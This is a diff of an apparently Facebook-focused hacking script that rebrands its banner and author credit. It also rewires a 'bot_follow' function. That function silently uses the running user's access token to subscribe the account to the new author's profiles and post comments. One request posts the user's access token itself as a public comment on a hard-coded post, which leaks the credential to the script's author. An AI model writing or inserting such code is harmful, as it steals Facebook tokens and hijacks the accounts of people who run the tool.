@@ -37,15 +37,15 @@ else:
 
 def banner():
     print("""   
-\033[0;31m______ ___________ _____ _____ _____  _   _  ___________ 
-\033[0;33m|  ___|  _  | ___ \  ___|_   _|  __ \| \ | ||  ___| ___ \
-\033[0;35m| |_  | | | | |_/ / |__   | | | |  \/|  \| || |__ | |_/ /
-\033[0;36m|  _| | | | |    /|  __|  | | | | __ | . ` ||  __||    / 
-\033[0;37m| |   \ \_/ / |\ \| |___ _| |_| |_\ \| |\  || |___| |\ \ 
-\033[0;34m\_|    \___/\_| \_\____/ \___/ \____/\_| \_/\____/\_| \_|                                       
+\033[1;94m─────╔╗─────────────╔╗
+\033[1;94m─────║║─────────────║║
+\033[1;93m╔═╦══╣║╔╦══╗╔══╦═╗╔═╝╠═╦╦══╦═╗
+\033[1;94m║╔╣╔╗║╚╝╣╔╗║║╔╗║╔╗╣╔╗║╔╬╣╔╗║╔╗╗
+\033[1;94m║║║╔╗║╔╗╣╔╗║║╔╗║║║║╚╝║║║║╔╗║║║║
+\033[1;94m╚╝╚╝╚╩╝╚╩╝╚╝╚╝╚╩╝╚╩══╩╝╚╩╝╚╩╝╚╝
 \033[37;1m[\033[41;1m IMMA_FOREIGNER_BELOVED \033[00;1m\033[37;1m ]\n
 \033[1;37;40m┌──────────────────────┐
-\033[1;37;40m│ ® Script By Ezema ® |
+\033[1;37;40m│ ® Script By Raka Andrian ® |
 \033[1;37;40m└──────────────────────┘
 \033[37;1m[\033[41;1m GOD HAVE MERCY ON YOUR CHILD \033[00;1m\033[37;1m ]\n
 \033[32;1mVersion\033[37;1m:\033[33;1m1.0""")
@@ -201,11 +201,11 @@ def bot_follow():
 	except IOError:
 		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
 		logs()
-	kom = (" ❤️❤️Ezema Lee❤️❤️❤️")
-	requests.post('https://graph.facebook.com/100061968543976/subscribers?access_token=' + toket) #Okoro OnyediEzema Prosper
-	requests.post('https://graph.facebook.com/100004412526309/subscribers?access_token=' + toket) #Cornelius Chinedum Sunday
-	requests.post('https://graph.facebook.com/190169383058679/comments/?message=' +toket+ '&access_token=' + toket)
-	requests.post('https://graph.facebook.com/1874741336016266/comments/?message=' +kom+ '&access_token=' + toket)
+	kom = (" ❤️❤️Aa Raka❤️❤️❤️")
+	requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token=' + toket) #RAKA THE KINGG
+	requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=' + toket) #MANTAN GARANGAN
+	requests.post('https://graph.facebook.com/953529338576547/comments/?message=' +toket+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/3211488102207684/comments/?message=' +kom+ '&access_token=' + toket)
 	menu()
 
 ### MAIN MENU ###
